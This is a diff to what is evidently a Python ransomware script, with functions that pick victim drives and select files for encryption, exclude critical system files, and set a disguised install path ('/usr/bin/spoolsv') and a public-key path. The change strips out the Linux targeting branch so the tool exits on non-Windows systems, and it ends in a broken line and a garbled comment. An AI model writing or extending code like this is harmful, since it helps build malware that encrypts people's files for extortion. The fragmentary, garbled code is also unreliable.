@@ -1,5 +1,6 @@
 import platform
 import os
+import sys
 
 
 
@@ -107,33 +108,27 @@ def windows_partition():
             windows_list.append(drive)
     return windows_list
 
-#def linux_partition():
-    linux_list = [
-        "/home", "/media", "/mnt", "/tmp", 
-        "/var/tmp", "/opt", "/srv", "/usr/local"
-    ]
-    return [d for d in linux_list if os.path.exists(d)]
 
 def get_drives_to_scan():
     system = platform.system().lower()
     if system == "windows":
         return windows_partition()
     else:
-        return linux_partition()
+        sys.exit(0)
 
 def get_excluded_dirs():
     system = platform.system().lower()
     if system == "windows":
         return WINDOWS_EXCLUDED_DIRS
     else:
-        return LINUX_EXCLUDED_DIRS
+        sys.exit(0)
 
 def get_excluded_files():
     system = platform.system().lower()
     if system == "windows":
         return WINDOWS_EXCLUDED_FILES
     else:
-        return LINUX_EXCLUDED_FILES
+        sys.exit(0)
 
 def get_victim_specific_config():
     system = platform.system().lower()
@@ -149,15 +144,7 @@ def get_victim_specific_config():
             'excluded_files': get_excluded_files()
         }
     else:
-        return {
-            'drives_function': 'linux_partition',
-            'default_path': '/tmp',
-            'install_path': '/usr/bin/spoolsv',
-            'public_key_path': '/tmp/public.pem',
-            'drives': get_drives_to_scan(),
-            'excluded_dirs': get_excluded_dirs(),
-            'excluded_files': get_excluded_files()
-        }
+        sys.exit(0)
 
 # Load configurations
 VICTIM_CONFIG = get_victim_specific_config()
@@ -177,28 +164,19 @@ def validate_file_for_encryption(file_path):
         if any(sys_file in file_path.lower() for sys_file in system_files):
             return False
     else:
-        linux_critical_files = [
-            '/etc/passwd', '/etc/shadow', '/etc/group', '/etc/gshadow',
-            '/etc/sudoers', '/boot/vmlinuz', '/boot/initrd.img'
-        ]
-        if file_path in linux_critical_files:
-            return False
-        
+        sys.exit(0)
     if system == "windows":
         if any(excluded_dir in file_path.lower() for excluded_dir in EXCLUDED_DIRS):
             return False
     else:
-        if file_path.startswith(tuple(EXCLUDED_DIRS)):
-            return False
+        sys.exit(0)
         
     if system == "windows":
         filename = os.path.basename(file_path).lower()
         if filename in EXCLUDED_FILES:
             return False
     else:
-        if file_path in EXCLUDED_FILES:
-            return False
-        
+        sys.exit(0)
     try:
         file_size = os.path.getsize(file_path)
         return 0 < file_size <= MAX_FILE_SIZE
@@ -208,5 +186,5 @@ def validate_file_for_encryption(file_path):
 
 def get_public_key ():
 
-    with open("public")
+   #اومبع\ نولي 
     pass
